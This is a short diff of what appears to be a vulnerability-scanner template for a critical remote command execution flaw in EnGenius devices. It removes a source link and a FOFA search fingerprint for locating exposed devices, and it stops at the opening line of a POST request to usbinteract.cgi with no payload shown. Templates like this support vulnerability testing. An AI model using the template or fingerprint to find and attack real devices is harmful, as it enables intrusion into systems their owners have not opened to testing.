@@ -3,12 +3,8 @@ info:
   name: EnGenius usbinteract存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gcfruf0pggymravu'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gcfruf0pggymravu
-    fofa: body="/web/images/guest.png" && body="/web/images/admin.png"
 http:
 - raw:
   - 'POST /web/cgi-bin/usbinteract.cgi HTTP/1.1
